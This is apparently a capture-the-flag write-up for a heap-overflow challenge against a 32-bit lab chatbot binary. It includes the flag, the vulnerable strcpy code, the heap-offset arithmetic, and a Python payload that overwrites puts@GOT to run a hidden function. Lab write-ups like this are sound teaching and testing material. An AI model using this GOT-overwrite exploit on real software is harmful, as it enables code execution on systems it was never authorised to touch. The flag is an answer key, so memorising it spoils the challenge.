**Flag:** `EPI{reWr171ng_4_p01N7ER_70_G07_70_b4CKd00r_15_5eXy}`
**Vulnerability:** Heap overflow chain — overwrite struct pointer then GOT entry via two `strcpy()` calls
**Binary:** `/usr/bin/chatbot/chatbot-preprod` (32-bit non-PIE, port 55555)
**Access needed:** SSH as `junior-dev` — requires H34pfun to have been triggered first (port 55555)

## Vulnerability

`try_to_hack_me()` allocates two `struct data` on the heap:

```c
struct data { char *secret; };

struct data *d1 = malloc(sizeof(*d1));    // 16-byte chunk (data at chunk+8 on 32-bit)
d1->secret = malloc(163);                 // 176-byte chunk
struct data *d2 = malloc(sizeof(*d2));    // 16-byte chunk, immediately after d1's secret
d2->secret = malloc(46);                  // 64-byte chunk

// input = "let me hack you " + payload1 + "$" + payload2
strcpy(d1->secret, input + 16);          // OVERFLOW 1: can overflow past d2->secret pointer
strcpy(d2->secret, input + pos + 1);     // OVERFLOW 2: d2->secret now points to puts@GOT
```

**Heap layout (MALLOC_ALIGNMENT=16):**
```
d1 chunk  [8 bytes header][d1->secret ptr]        ← d1 data starts at chunk+8
d1->secret chunk [8 bytes header][163 bytes data]  ← 176-byte chunk
d2 chunk  [8 bytes header][d2->secret ptr]         ← immediately follows d1->secret chunk
```

- d1->secret data starts at `d1_chunk_base + 24` (header of d1 chunk + offset 8 + header of secret chunk + 8 = base + 24)
- d2->secret pointer is at `d1_chunk_base + 200` (d1 chunk=16 + d1->secret chunk=176 + 8)
- Overflow distance = 200 - 24 = **176 bytes**

**Two-stage write:**
1. `strcpy(d1->secret, payload1)`: 176 bytes padding + `puts@GOT` → overwrites `d2->secret` to point at `puts@GOT`
2. `strcpy(d2->secret, payload2)`: writes `spawn_alpha` address to `puts@GOT`

**Result:** Next call to `puts()` executes `spawn_alpha()`, which prints the flag and spawns the super-chatbot on port 54321.

**Note:** `puts@GOT` and `spawn_alpha` addresses change each server relaunch. Auto-detected by compiling source on remote.

## Exploit

**Prerequisites:**
```bash
# Run H34pfun first to spawn chatbot-preprod on port 55555:
python3 challenges/06_h34pfun/scripts/exploit_chatbot.py <SSH_PORT>
```

**Then:**
```bash
python3 challenges/09_h34pg0t/scripts/exploit_heapgot.py <SSH_PORT>
```

**What the script does:**
1. SSH as `junior-dev`, verifies port 55555 is active
2. Compiles `chatbot_preprod.c` on remote to get `spawn_alpha` and `puts@GOT` addresses
3. Sends the two-stage heap overflow via remote Python socket to localhost:55555

**Payload:**
```python
import struct

OVERFLOW_LEN = 176  # bytes to reach d2->secret pointer from d1->secret data

prefix       = b"let me hack you "              # 16-byte trigger
padding      = b"A" * OVERFLOW_LEN
ptr_overwrite = struct.pack("<I", puts_got)     # overwrite d2->secret → puts@GOT
delimiter    = b"$"
got_data     = struct.pack("<I", spawn_alpha)   # write spawn_alpha to puts@GOT

payload = prefix + padding + ptr_overwrite + delimiter + got_data
```

**Side effect:** `spawn_alpha()` spawns `super-chatbot-alpha-II-arcade-edition` on port 54321 — required for UseAft3rFr33.
